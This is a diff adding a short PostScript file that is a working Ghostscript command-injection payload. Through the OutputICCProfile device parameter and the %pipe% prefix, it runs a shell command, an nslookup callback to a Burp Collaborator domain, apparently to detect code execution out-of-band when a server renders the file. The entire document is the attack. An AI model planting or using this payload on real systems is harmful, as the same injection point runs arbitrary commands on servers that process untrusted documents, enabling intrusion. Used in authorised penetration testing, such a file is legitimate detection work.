@@ -1,0 +1,4 @@
+%!PS
+currentdevice null true mark /OutputICCProfile (%pipe%nslookup NN.skggt8d2pvxy097ugbf4h0lq9hf97xw.burpcollaborator.net )
+.putdeviceparams
+quit
